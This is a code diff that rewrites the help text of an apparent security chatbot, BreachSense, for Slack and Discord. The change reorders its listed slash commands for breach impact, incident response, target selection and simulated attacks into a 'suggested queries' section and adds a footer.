 | \`/breach <type>\` | Get incident response guidance |
+| \`/target <url>\` | Change target application |
 | \`/help\` | Show all available commands |
-
-### Example Queries
-
-- \`/impact vercel breach\` - How would a Vercel breach affect ${domain}?
-- \`/breach .env leak\` - What to do if .env file is leaked?
-- \`/break\` - Simulate attack on current target
 
 ---
 
-**Tip:** Click the gear icon to change your target application, or use \`/target <url>\`.`;
+### SUGGESTED QUERIES
+
+Based on your target, try:
+- \`/break\` - See vulnerabilities in ${domain}
+- \`/impact vercel breach\` - How would a Vercel breach affect you?
+- \`/breach .env leak\` - What if your .env file was exposed?
+
+---
+
+**Tip:** Use the gear icon to configure your target application.
+
+---
+
+*This response was generated by BreachSense running across ChatSDK platforms (Slack + Discord ready).*`;
 }
